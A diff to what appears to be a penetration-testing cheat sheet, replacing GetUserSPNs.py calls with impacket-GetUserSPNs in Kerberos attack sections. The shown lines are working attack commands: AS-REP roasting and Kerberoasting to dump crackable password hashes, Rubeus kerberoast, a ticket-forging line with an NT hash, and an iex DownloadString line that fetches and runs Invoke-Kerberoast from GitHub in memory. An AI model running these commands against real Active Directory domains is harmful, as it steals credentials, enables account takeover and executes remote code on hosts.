@@ -2810,12 +2810,11 @@ impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
 impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
 ```
 
-##### impacket-getUserSPNs / GetUserSPNs.py
+##### impacket-getUserSPNs
 
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
-./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
 ```
 
 ##### impacket-secretsdump
@@ -2854,7 +2853,7 @@ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-
 ###### Issue
 
 ```c
-./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
+impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] exceptions must derive from BaseException
@@ -2954,7 +2953,7 @@ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
 ##### Kerberoasting
 
 ```c
-python GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
 .\Rubeus.exe kerberoast /outfile:<FILE>
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
